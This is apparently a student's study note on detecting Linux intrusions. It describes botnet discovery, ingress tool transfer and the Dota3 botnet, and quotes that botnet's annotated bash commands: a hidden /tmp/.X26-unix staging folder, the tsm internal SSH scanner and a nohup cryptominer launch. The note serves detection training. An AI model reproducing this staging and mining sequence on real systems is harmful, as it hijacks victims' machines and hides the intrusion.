---
title: Linux Threat Detection 2
updated: 2026-03-31 06:52:53Z
created: 2026-03-05 15:36:23Z
latitude: 21.02776440
longitude: 105.83415980
altitude: 0.0000
---

# <span style="color: rgb(241, 196, 15);">Discovery Overview</span>

- botnets usually automate the initial Access and human attackers join only when an entry point is ready
- ![342f11e8c435a85fbb9cf0ca83a0d5e6.png](../../../_resources/342f11e8c435a85fbb9cf0ca83a0d5e6.png)

## First Actions

- the first discovery commands threat actors run on the linux systems are usally the same.
- ![35697186ce749635bd627bbd9ec7b86a.png](../../../_resources/35697186ce749635bd627bbd9ec7b86a.png)

# <span style="color: rgb(241, 196, 15);">Detecting Discovery</span>

## Specialized Discovery

- ![e83d1f9b8f031511eca106bd1d2e0d04.png](../../../_resources/e83d1f9b8f031511eca106bd1d2e0d04.png)

# <span style="color: rgb(241, 196, 15);">**Hack and Forget Attacks**</span>

- **Install Cryptominer:** Earn money by using victim's CPU/GPU to mine cryptocurrency.
- **Enroll to botnet:** Add the victim to a botnet and use it for tasks like DDos.
- **Use as Proxy:** use the victim to send phishing, host malware, or route the attacker's traffic.

## Ingress tool transfer

- is a term in MITRE to ask "what tool attackers use to download malware".
- ![7a5a293debfe7ba6257abb9e1df5d201.png](../../../_resources/7a5a293debfe7ba6257abb9e1df5d201.png)
- these commands above can be logged with auditd and appear in Bash hostory.
- if the victim is reachable over SSH, attackers can run scp | sftp from their own systems, these commands won't be logged in auditd, but have a new SSH login.
- ![7cfe2733978954572ede7cd9c899ae58.png](../../../_resources/7cfe2733978954572ede7cd9c899ae58.png)

# <span style="color: rgb(241, 196, 15);">Dota3: First Actions</span>

## Initial Attack

- the botnet of more than 2000 distinct IPs, accross 94 contries scans the internet for systems with open SSH.
- the botnet brute-forces the systems, mainly targeting the root user and trying the 1000 weak passwords
- if the password was gussed, one of the botnet hosts accesses the victim via SSH and continues attack.

## Discovery

from within the SSH session:

threat actor automates the Discovery by running multiple commands.

- ![e7301ee6e19791bd233ecf03e59db4c2.png](../../../_resources/e7301ee6e19791bd233ecf03e59db4c2.png)

## Persistence

- ![e8d7a6ec5de3e691c3cc73fc66f628bb.png](../../../_resources/e8d7a6ec5de3e691c3cc73fc66f628bb.png)
- changes password more complex to avoid other competitor's botnets.
- replace all SSH keys with the malicious one.

## Detecting the Attack

- ![ab39851ca8a38b4080e864a06e9a9a37.png](../../../_resources/ab39851ca8a38b4080e864a06e9a9a37.png)

# <span style="color: rgb(241, 196, 15);">Dota3: Miner Setup</span>

## Cryptominer Setup

![532e5717249709037fdb9389b22b5cfa.png](../../../_resources/532e5717249709037fdb9389b22b5cfa.png)

```bash
# Prepare a hidden /tmp/.X26-unix folder for malware
cd /tmp # the directory where everyone could write file without sudo privilege.
rm -rf .X2* # delete all files with the head is X2.
mkdir .X26-unix # create an dir named sophisticatedly to decieve.
cd .X26-unix
# Unarchive malware to /tmp/.X26-unix/.rsync/c folder
tar xf dota3.tar.gz # unarchive the file
sleep 3s # to evade EDR system sweeping or waiting for extracting done.
cd /tmp/.X26-unix/.rsync/c # moving forward deeply to extracted file.

```

Lastly. attackers execute two binaries from the archive:

1.  **<span style="color: rgb(241, 196, 15);">tsm</span>**: customized network scanner --> probes internal network to check if any services running SSH service (port 22).
2.  **<span style="color: rgb(241, 196, 15);">initial</span>**: is an cryptominer that loads the victim's CPU to generate revenue for them.

```bash
# Scan the internal network with the "tsm" malware
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>&1 &
sleep 8m
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>&1 &
sleep 20m
# Run the actual cryptominer named "initall"
cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
# That's it, Dota3 attack is now completed!
exit 0
```

<span style="color: rgb(241, 196, 15);">**nohup**</span> : allows the processes continue running in the background even after session SSH is closed.

\>> /dev/null 2>&1 : whaterver (outputs) gonna be give to /dev/null (garbage) so victim won't see anything on console.

&nbsp;